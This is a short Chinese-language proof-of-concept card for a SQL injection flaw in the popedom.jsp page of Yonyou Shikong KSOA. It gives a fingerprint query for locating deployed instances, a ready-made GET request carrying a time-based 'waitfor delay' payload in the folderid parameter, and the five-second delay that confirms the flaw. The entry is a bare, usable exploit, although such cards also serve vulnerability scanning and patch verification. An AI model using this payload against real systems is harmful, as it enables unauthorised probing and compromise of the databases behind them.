# 用友时空KSOApopedom.jsp存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="用友-时空KSOA"`
- **请求**：`GET /km/popedom.jsp?folderid=1'%3Bwaitfor+delay+'0%3a0%3a5'--+ HTTP/1.1`
- **响应特征**：200 响应时间>=5s